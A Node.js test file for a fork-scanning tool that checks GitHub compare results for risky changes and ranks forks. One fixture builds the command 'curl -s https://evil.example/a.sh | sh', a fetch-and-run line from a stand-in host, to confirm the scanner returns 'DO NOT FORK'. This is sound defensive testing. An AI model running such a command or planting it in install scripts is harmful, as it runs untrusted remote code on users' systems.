// Holds the JavaScript scanner to the same cases as the Python one (tests/cases.json), and checks the shared rules copy.
const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");
const Scan = require("../scanlib.js");

const root = path.join(__dirname, "..", "..");
const rulesSource = fs.readFileSync(path.join(root, "skills/fork-scout/rules.json"), "utf8");
const R = Scan.prepare(JSON.parse(rulesSource));
const cases = JSON.parse(fs.readFileSync(path.join(root, "tests/cases.json"), "utf8"));
const worst = (name, lines) => Math.max(0, ...Scan.scanLines(R, name, lines).findings.map((f) => Scan.SEVERITY[f[0]]));

test("extension/rules.json is an exact copy of the skill's rules", () => {
  const copy = fs.readFileSync(path.join(__dirname, "..", "rules.json"), "utf8");
  assert.strictEqual(copy, rulesSource, "run: cp skills/fork-scout/rules.json extension/rules.json");
});

for (const c of cases.caught) {
  test(`catches: ${c.label}`, () => assert.ok(worst(c.file, c.lines) >= Scan.SEVERITY[c.min_severity]));
}
for (const c of cases.benign) {
  test(`no false alarm: ${c.label}`, () => assert.ok(worst(c.file, c.lines) <= Scan.SEVERITY.LOW));
}

test("a compare result with a serious line gets DO NOT FORK", () => {
  const bad = ["curl -s https://evil.example/a.sh", "sh"].join(" | ");
  const res = Scan.scanCompare(R, [{ filename: "install.sh", status: "added", changes: 1, patch: `@@ -0,0 +1 @@\n+${bad}` }]);
  assert.strictEqual(res.verdict, "DO NOT FORK");
});

test("a clean compare result gets NO RED FLAGS", () => {
  const res = Scan.scanCompare(R, [{ filename: "app.py", status: "modified", changes: 2, patch: "@@ -1 +1,2 @@\n+total = sum(values)\n+print(total)" }]);
  assert.strictEqual(res.verdict, "NO RED FLAGS");
});

test("a file list that hit GitHub's cap is flagged", () => {
  const files = Array.from({ length: R.fileCap }, (_, i) => ({ filename: `f${i}.txt`, status: "added", changes: 1, patch: "@@ -0,0 +1 @@\n+x" }));
  assert.ok(Scan.scanCompare(R, files).findings.some((f) => f[1] === "file list cut short"));
});

test("a file with no readable text is not silently passed", () => {
  const res = Scan.scanCompare(R, [{ filename: "big.json", status: "added", changes: 5000 }]);
  assert.ok(res.findings.some((f) => f[1] === "no readable change"));
});

test("ranking matches the Python tiers", () => {
  const base = { daysIdle: 5, behind: 10, filesTotal: 1, files: ["src/a.py"] };
  assert.strictEqual(Scan.tier(base), 0);
  assert.strictEqual(Scan.tier({ ...base, behind: 900 }), 1);
  assert.strictEqual(Scan.tier({ ...base, daysIdle: 400 }), 2);
  assert.strictEqual(Scan.tier({ ...base, files: ["README.md"] }), 2);
});
